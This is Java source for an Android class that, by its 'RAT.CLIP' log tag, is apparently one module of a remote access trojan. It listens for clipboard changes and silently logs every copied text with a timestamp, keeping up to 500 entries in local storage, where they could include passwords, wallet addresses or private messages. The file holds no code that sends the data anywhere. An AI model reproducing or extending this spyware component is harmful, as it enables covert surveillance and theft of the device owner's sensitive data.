package com.nullx.pp;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.SharedPreferences;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class ClipboardMonitor {
    private static final String TAG = "RAT.CLIP";
    private static ClipboardManager.OnPrimaryClipChangedListener listener;
    private static String lastClip = "";

    public static void start(Context ctx) {
        try {
            ClipboardManager cm = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm == null) return;

            listener = () -> {
                try {
                    ClipData clip = cm.getPrimaryClip();
                    if (clip == null || clip.getItemCount() == 0) return;
                    CharSequence text = clip.getItemAt(0).getText();
                    if (text == null) return;
                    String current = text.toString();
                    if (current.equals(lastClip)) return;
                    lastClip = current;

                    SharedPreferences sp = ctx.getSharedPreferences("ClipPrefs", Context.MODE_PRIVATE);
                    String existing = sp.getString("clips", "[]");
                    JSONArray arr = new JSONArray(existing);
                    JSONArray newArr = new JSONArray();
                    int start = Math.max(0, arr.length() - 500);
                    for (int i = start; i < arr.length(); i++) newArr.put(arr.get(i));

                    JSONObject entry = new JSONObject();
                    entry.put("text", current);
                    entry.put("time", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()));
                    newArr.put(entry);
                    sp.edit().putString("clips", newArr.toString()).apply();

                    Log.d(TAG, "Clip: " + current.substring(0, Math.min(50, current.length())));
                } catch (Exception e) {
                    Log.e(TAG, "clip error: " + e.getMessage());
                }
            };
            cm.addPrimaryClipChangedListener(listener);
        } catch (Exception e) {
            Log.e(TAG, "start error: " + e.getMessage());
        }
    }

    public static void stop(Context ctx) {
        try {
            ClipboardManager cm = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm != null && listener != null) cm.removePrimaryClipChangedListener(listener);
        } catch (Exception ignored) {}
    }
}